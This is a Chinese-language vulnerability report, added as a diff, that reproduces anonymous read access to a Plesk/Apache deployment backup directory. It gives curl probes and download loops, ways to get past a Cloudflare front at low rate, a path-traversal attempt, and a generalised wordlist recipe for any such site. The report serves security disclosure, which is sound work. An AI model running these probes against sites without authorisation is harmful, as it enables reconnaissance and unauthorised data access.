@@ -1,0 +1,106 @@
+# copperline 部署备份目录匿名可读（Plesk/Apache 静态站点）
+
+## 前置条件
+- 目标静态站点由 Plesk + Apache 托管，web 根下残留部署备份目录（本例 `/bbs-<product>/Backup/`）。
+- 目录关闭了 index 列举（403），但未对具体文件做访问控制。
+- 无需任何凭据/Cookie；HTTPS 直连即可（Cloudflare 前置时用浏览器 UA，单线程低速率）。
+
+## 复现步骤
+
+### 1. 证明目录存在且只是"禁列"
+```bash
+HOST=copperline.<domain>
+PROD=bbs-copperline
+
+# 无斜杠 → 301，证明目录存在
+curl -skI "https://$HOST/$PROD/Backup"
+
+# 带斜杠 → 403，Plesk "Forbidden"（约 1909B），只是禁止目录列举
+curl -sk -D- -o /dev/null "https://$HOST/$PROD/Backup/"
+
+# OPTIONS → 200，content-type: httpd/unix-directory，allow: POST,OPTIONS,HEAD,GET
+# 这是服务端对"它是目录"的硬确认
+curl -sk -X OPTIONS -D- -o /dev/null "https://$HOST/$PROD/Backup/"
+```
+
+实测响应（2026-11-11）：
+```
+HTTP/2 403
+content-type: text/html; charset=utf-8
+content-length: 1909     # Plesk Forbidden 页
+
+HTTP/2 200
+allow: POST,OPTIONS,HEAD,GET
+content-type: httpd/unix-directory
+```
+
+### 2. 直读备份子目录里的交付文档
+```bash
+curl -sk -D- "https://$HOST/$PROD/Backup/new/README.md" | head -20
+```
+实测：`HTTP/2 200`，`content-type: text/markdown`，`content-length: 4741`，
+正文首行：
+```
+# Copperline web bundle for Retro32 (2026-07-20, fourth drop)
+```
+README 内含构建时间、版本、文件清单与构建/部署说明。
+
+### 3. 按 README 清单取文件（size 与 content-type 双重校验）
+```bash
+for f in \
+  new/README.md \
+  new/try.js \
+  new/pkg/copperline_web.js \
+  new/pkg/copperline_web_bg.wasm \
+  new/aros/LICENSE \
+  new/adf/retro32-term.adf \
+  new/copperline.json.example \
+  README.md ; do
+  code=$(curl -sk -o "/tmp/$(basename "$f")" -w '%{http_code} %{size_download} %{content_type}' \
+        "https://$HOST/$PROD/Backup/$f")
+  echo "$f -> $code"
+done
+```
+实测结果：
+| 路径 | 状态 | 大小 |
+|---|---|---|
+| `/Backup/new/README.md` | 200 text/markdown | 4741 |
+| `/Backup/new/try.js` | 200 | 90628 |
+| `/Backup/new/pkg/copperline_web.js` | 200 | 28978 |
+| `/Backup/new/pkg/copperline_web_bg.wasm` | 200 | 2216856 |
+| `/Backup/new/aros/LICENSE` | 200 | 24679 |
+| `/Backup/new/adf/retro32-term.adf` | 200 | 901120 |
+| `/Backup/new/copperline.json.example` | 200 | 145 |
+| `/Backup/README.md` | 200 text/markdown | 5058 |
+
+配置示例内容（泄露后端桥接端点）：
+```json
+{"df0":"adf/retro32-term.adf","joy":"off","floppy_sounds":false,
+ "serial_url":"wss://bbs.<domain>:8443/","autoboot":true}
+```
+上一级 `README.md` 泄露发布版本：v0.18.0（commit 2d12257f）。
+
+### 4. 阴性对照（必做）
+```bash
+curl -sk -o /dev/null -w '%{http_code} %{size_download}\n' \
+  "https://$HOST/$PROD/Backup/zzq-nonexistent-9f3a"
+# 实测：404 1922   （Plesk 404 固定长度）
+```
+403（禁列）与 404（不存在）可差分，且 200 文件的大小与 README 声明一致，
+排除"全站 SPA 壳页一律 200"的假阳性。
+
+### 5. 已排除的路径（避免重复投入）
+- `/Backup/New/`、`/Backup/2026-07-20/` → 404（大小写/日期命名无效）。
+- `/Backup/*.zip`（110+ 常见备份文件名）→ 全部 404，无压缩包直下。
+- `/Backup/%2e%2e/` 等穿越 → 返回 200 重定向壳页，非真实穿越，不要误报。
+
+## 影响与定性
+- 泄露：产品版本、构建日期、完整文件清单、前端 wasm/js、示例配置与 WebSocket 端点
+  `wss://bbs.<domain>:8443/`。
+- 未见：服务端源码、凭据、数据库配置、私钥。故定级 low（信息泄露），
+  价值在于为后续 WebSocket 桥接服务与前端逆向提供入口与版本基线。
+
+## 通用化
+任何 Plesk/Apache 静态站点都适用此判据：
+`301(无斜杠) + 403(禁列) + OPTIONS: httpd/unix-directory` 三者同现即备份目录存在，
+随后按 `new|latest|old|dist|build|YYYY-MM-DD` 小字典 + README 反推文件名逐个取。
